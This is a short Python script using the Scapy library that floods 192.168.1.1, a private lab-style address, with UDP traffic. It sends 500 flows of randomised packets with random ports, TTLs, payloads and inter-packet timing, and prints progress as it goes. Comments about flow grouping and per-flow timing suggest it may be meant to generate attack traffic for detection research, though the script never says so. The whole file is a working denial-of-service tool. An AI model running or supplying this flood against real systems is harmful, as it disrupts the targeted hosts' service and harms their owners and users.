from scapy.all import *
import random
import time

TARGET_IP = "192.168.1.1"
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

print(f"[*] Starting DoS UDP Flood -> {TARGET_IP}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # Fixed per flow — ensures proper flow grouping
    sport    = random.randint(1024, 65535)
    dport    = random.randint(1, 65535)      # FIXED per flow
    ttl      = random.randint(32, 128)
    packets  = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow IAT
    iat_min  = random.uniform(0.00001, 0.0001)
    iat_max  = random.uniform(iat_min + 0.00005, 0.001)

    for p in range(packets):
        # Fully random payload per packet → variance
        payload_size = random.randint(64, 1400)
        payload      = bytes([random.randint(0, 255)
                        for _ in range(payload_size)])

        pkt = IP(
            dst = TARGET_IP,
            ttl = ttl,
            id  = random.randint(1, 65535)
        ) / UDP(
            sport = sport,
            dport = dport                    # FIXED per flow
        ) / Raw(load=payload)

        send(pkt, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.001, 0.005))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")